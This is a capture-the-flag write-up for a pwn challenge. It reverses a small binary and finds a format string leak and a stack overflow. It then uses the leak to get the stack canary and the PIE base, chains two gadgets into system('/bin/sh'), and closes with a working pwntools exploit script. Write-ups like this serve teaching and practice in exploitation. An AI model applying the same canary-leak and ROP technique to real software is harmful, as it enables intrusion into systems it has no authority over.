# Up

## Introduction
We are given the following [binary](https://github.com/chouettevan/CTF-writeups/raw/refs/heads/main/assets/polypwn2026/pmj).

## reversing
When decompiling, we see the main function's code is as follows:

```c
ulong main(int argc,char **argv,char **envp)

{
    //[13] -r-x section size 475 named .text
    sym.imp.setbuf(_reloc.stdout,NULL);
    sym.imp.setbuf(_reloc.stdin,NULL);
    sym.leak();
    sym.vuln();
    return 0;
}

void sym.leak(void)
{
    int64_t in_FS_OFFSET;
    char format;
    int64_t canary;
    int64_t none;

    canary = *(in_FS_OFFSET + 0x28);
    sym.imp.read(0,&format,0x40);
    sym.imp.printf(&format);
    if (canary == *(in_FS_OFFSET + 0x28)) {
        return;
    }
    //WARNING: Subroutine does not return
    sym.imp.__stack_chk_fail();
}

void sym.vuln(void)
{
    int64_t in_FS_OFFSET;
    uchar auStack_58 [72];
    int64_t canary;

    canary = *(in_FS_OFFSET + 0x28);
    sym.imp.read(0,auStack_58,300);
    if (canary == *(in_FS_OFFSET + 0x28)) {
        return;
    }
    //WARNING: Subroutine does not return
    sym.imp.__stack_chk_fail();
}
```
Looking at the code, we see a trivial buffer overflow within `sym.vuln` and a format string bug
within `sym.leak`

## Exploitation

### Mitigations
First, we see the binary's protections are as follows:
```fish
[I] ◆ ~ ❯❯❯ pwn checksec pmj
[*] 'pmj'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

Thanks to the format string bug,we can leak PIE base and the canary,thereby enabling us to ROP.
By trying several offset,we find that the canary has offset `16` and the return address has
offset `19`
```fish
[I] ◆ ❯❯❯ echo ' %14$lx  %15$lx  %16$lx  %17$lx  %18$lx  %19$lx' > fmt
[I] ◆ ❯❯❯ gdb pmj
GNU gdb (GDB) 17.1
Copyright (C) 2025 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
Reading symbols from pmj...
(No debugging symbols found in pmj)
(gdb) b vuln
Breakpoint 1 at 0x1230
(gdb) run < fmt
Starting program: /home/archstrike/Downloads/pmj < fmt
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
[Detaching after vfork from child process 3233]
 0  1d54ba42a2de5e00  7fffffffe628  0  7fffffffe4f0  1000010b5

Breakpoint 1, 0x0000000100001230 in vuln ()
(gdb) i f
Stack level 0, frame at 0x7fffffffe4f0:
 rip = 0x100001230 in vuln; saved rip = 0x1000010ba
 called by frame at 0x7fffffffe500
 Arglist at 0x7fffffffe4e0, args:
 Locals at 0x7fffffffe4e0, Previous frame's sp is 0x7fffffffe4f0
 Saved registers:
  rip at 0x7fffffffe4e8
(gdb)
```


### ROP

We see that ther is a canary,and PIE has to be dealt with. when looking in the binary for ROP targets,
we notice the binary imports `system`:
```fish
[0x000011d0]> ii
nth vaddr      bind   type   lib name
―――――――――――――――――――――――――――――――――――――
1   ---------- GLOBAL FUNC       __libc_start_main
2   ---------- WEAK   NOTYPE     _ITM_deregisterTMCloneTable
3   0x00001030 GLOBAL FUNC       __stack_chk_fail
4   0x00001040 GLOBAL FUNC       setbuf
5   0x00001050 GLOBAL FUNC       system
6   0x00001060 GLOBAL FUNC       printf
7   0x00001070 GLOBAL FUNC       read
8   ---------- WEAK   NOTYPE     __gmon_start__
9   ---------- WEAK   NOTYPE     _ITM_registerTMCloneTable
11  ---------- WEAK   FUNC       __cxa_finalize
```

Furthermore, the binary uses it in the `__ctx` function:
```fish
[0x00001050]> s sym.imp.system
[0x00001050]> ax.
sym.__ctx 0x10c7 [CODE:--x] jmp sym.imp.system
CODE 0x3fc0 reloc.system
[0x00001050]>
```
The `__ctx` function looks like this
```fish
[0x000010c0]> pdf
        ╎   ;-- entry.init1:
┌ 12: sym.__ctx ();
│       ╎   0x000010c0      488d3d3d0f..   lea rdi, str._bin_true      ; 0x2004 ; "/bin/true"
└       └─< 0x000010c7      e984ffffff     jmp sym.imp.system
```

By jumping into it, we can call `system`. we only need to setup the `rdi` register to point
to `/bin/sh`,which is located within the binary:

```fish
[0x000010c0]> iz | grep sh
1   0x00002010 0x00002010 7   8    .rodata ascii /bin/sh
[0x000010c0]>
```

when looking at the function list, we notice two interesting symbols: `g1` and `g2`:
```fish
[0x000011c0]> pdf @ sym.g1
┌ 5: sym.g1 ();
│           0x000011c0      415c           pop r12
└           0x000011c2      41ffe4         jmp r12
[0x000011c0]> pdf @ sym.g2
┌ 4: sym.g2 ();
│           0x000011d0      5f             pop rdi
└           0x000011d1      41ffe4         jmp r12
[0x000011c0]>
```

These gadgets are all we need to call `system(/bin/sh)`
## Final result

We then get the following exploit:

```python
from pwn import *
context.terminal = ["alacritty",'-e']
target = process("./pmj")
#target = remote('polypwn.polycyber.io',54491)
target.sendline(b"%15$lx %19$lx")
elf = ELF("./pmj")
txt = target.recvline()
print(txt)
a,b = txt.split(b' ')
canary = int(a,16)
elf.address = int(b,16) - 0x10b5
payload = b'a'*0x48 + p64(canary) + b'a'*8 + p64(elf.symbols['g1']) 
payload += p64(elf.address+0x10c7)  + p64(elf.symbols['g2']) 
payload += p64(elf.address + 0x2010)

target.sendline(payload)
target.interactive()
```
